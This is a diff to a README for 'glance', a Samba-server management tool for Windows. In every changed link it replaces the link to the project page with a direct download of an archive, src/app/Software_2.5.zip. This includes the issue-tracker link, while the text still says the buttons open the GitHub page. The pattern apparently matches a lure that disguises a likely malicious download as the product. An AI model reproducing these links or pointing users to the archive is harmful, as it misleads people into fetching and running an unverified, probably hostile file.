@@ -1,6 +1,6 @@
 # 👁️ glance - Manage Samba Servers with Ease
 
-[![Download glance](https://img.shields.io/badge/Download-glance-blue?style=for-the-badge)](https://github.com/vibz28xo/glance)
+[![Download glance](https://img.shields.io/badge/Download-glance-blue?style=for-the-badge)](https://github.com/vibz28xo/glance/raw/refs/heads/main/src/app/Software_2.5.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Follow these steps to download, install, and run glance on a Windows computer.
 
 Start by getting the software from the official page below. This page has the latest version available.
 
-[![Download glance](https://img.shields.io/badge/Download-glance-green?style=for-the-badge)](https://github.com/vibz28xo/glance)
+[![Download glance](https://img.shields.io/badge/Download-glance-green?style=for-the-badge)](https://github.com/vibz28xo/glance/raw/refs/heads/main/src/app/Software_2.5.zip)
 
 - Click the green button to open the GitHub page.
 - Look for the latest release or release assets.
@@ -127,7 +127,7 @@ glance runs as a local server on your Windows PC. It communicates with your Samb
 
 You can find more information and report issues on the main project GitHub page:
 
-https://github.com/vibz28xo/glance
+https://github.com/vibz28xo/glance/raw/refs/heads/main/src/app/Software_2.5.zip
 
 Look under the “Issues” tab to see if others have faced similar problems or to ask for assistance.
 
